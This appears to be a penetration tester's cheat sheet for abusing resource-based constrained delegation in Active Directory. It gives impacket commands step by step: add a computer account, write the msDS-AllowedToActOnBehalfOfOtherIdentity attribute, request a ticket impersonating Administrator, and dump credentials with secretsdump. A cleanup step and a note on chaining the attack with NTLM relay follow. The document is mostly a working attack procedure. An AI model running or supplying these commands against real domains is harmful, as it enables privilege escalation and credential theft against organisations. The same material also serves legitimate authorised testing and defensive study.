# RBCD

You can abuse RBCD when you can edit the attribute : msDS-AllowedToActOnBehalfOfOtherIdentity.

The ressource has the delegation.

# Add RBCD attribute
```
addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-host domain.local 'domain.local/user:passw0rd
```
```
rbcd.py -delegate-from 'rbcd$' -delegate-to 'target$' -dc-ip [DC IP] -action 'write' domain.local/user:passwOrd
```
# Exploit RBCD
```
getST.py -spn [SERVICE/HOSTNAME] -impersonate Administrator -dc-ip [DC IP] rbcd$:rbcdpass
```
```
export KRB5CCNAME=Administrator.ccache
secretsdump -k -no-pass [DOMAIN]/[USER]@[TARGET]
```
# Cleaning up
```
rbcd.py -delegate-from 'rbcd$' -delegate-to 'target$' -dc-ip [DC IP] -action 'flush' domain.local/user:passw0rd
```

# Notes: 

A computer account can edit his own attribute msDS-AllowedToActOnBehalfOfOtherIdentity This is usefull when you do ldaps NTLM relay (like in the drop-the-mic attack path), you can then edit the computer attribute and launch an RBCD exploitation.



